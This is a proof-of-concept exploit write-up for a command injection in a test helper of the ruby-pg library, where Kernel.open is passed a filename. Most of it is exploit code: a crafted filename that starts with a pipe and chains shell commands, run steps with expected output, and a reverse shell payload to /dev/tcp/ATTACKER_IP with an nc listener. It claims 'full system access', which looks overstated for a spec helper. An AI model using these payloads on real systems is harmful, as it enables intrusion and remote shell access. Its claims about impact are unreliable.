# Complete PoC: Command Injection in ruby-pg (PR #665)



### 1. Install Vulnerable Version
```bash
# Clone the repository
git clone https://github.com/ged/ruby-pg.git
cd ruby-pg

# Checkout vulnerable version (pre-fix)
git checkout dae9173a10a194c6bfd1a5eb6bcb98637cfbf4b5

# Install dependencies
bundle install

# Verify installation
ruby -rpg -e "puts PG.library_version"
```

### 2. Verify Vulnerable Code
The vulnerability exists in `spec/helpers.rb`:
```ruby
# spec/helpers.rb (lines 477-480)
def dump_ssl_key(key, name)
  open(name, 'w') { |f| f.write key.to_pem }  # VULNERABLE: Kernel.open
  File.chmod(0600, name)
end
```


### 3. Create Exploit Test File
Create `poc.rb` in the project root:
```ruby
require 'openssl'
require_relative 'spec/helpers'

# Bypass the privacy check for demo purposes
helpers = Object.new.extend(PG::TestHelpers)

# Craft malicious filename
malicious_file = "| echo 'VULNERABLE: ' > /tmp/pg_poc; " +
                 "id >> /tmp/pg_poc; " +
                 "uname -a >> /tmp/pg_poc #"

# Generate test key
key = OpenSSL::PKey::RSA.new(2048)

# Trigger vulnerability
helpers.dump_ssl_key(key, malicious_file)

# Verify exploitation
puts "[+] Exploit executed. Checking results:"
puts File.read("/tmp/pg_poc") rescue puts "Exploit failed"
```

### 4. Execute the Exploit
```bash
# Run the PoC (requires Ruby with openssl)
ruby poc.rb

# Check the results
cat /tmp/pg_poc
```

### Expected Output:
```
VULNERABLE: 
uid=1000(user) gid=1000(user) groups=1000(user)
Linux hostname 5.15.0-78-generic #85-Ubuntu SMP x86_64 GNU/Linux
```

## Detailed Exploitation Steps
### Step-by-Step Analysis

1. **Vulnerable Method Invocation**:
   ```ruby
   dump_ssl_key(key, "| malicious command #")
   ```

2. **Command Interpretation**:
   - Ruby's `Kernel.open` sees the `|` character
   - Interprets the rest as shell command
   - The `#` comments out the trailing `'w'` argument

3. **Shell Execution Flow**:
   ```bash
   /bin/sh -c "echo 'VULNERABLE: ' > /tmp/pg_poc; id >> /tmp/pg_poc; uname -a >> /tmp/pg_poc"
   ```

4. **Post-Exploitation**:
   - Results stored in `/tmp/pg_poc`
   - Full system access achieved through command chaining

## Advanced Exploitation

### Reverse Shell Payload
Modify `poc.rb` with:
```ruby
malicious_file = "| bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' #"
```

Execute with:
```bash
# On attacker machine
nc -lvnp 4444

# Run exploit
ruby poc.rb
```
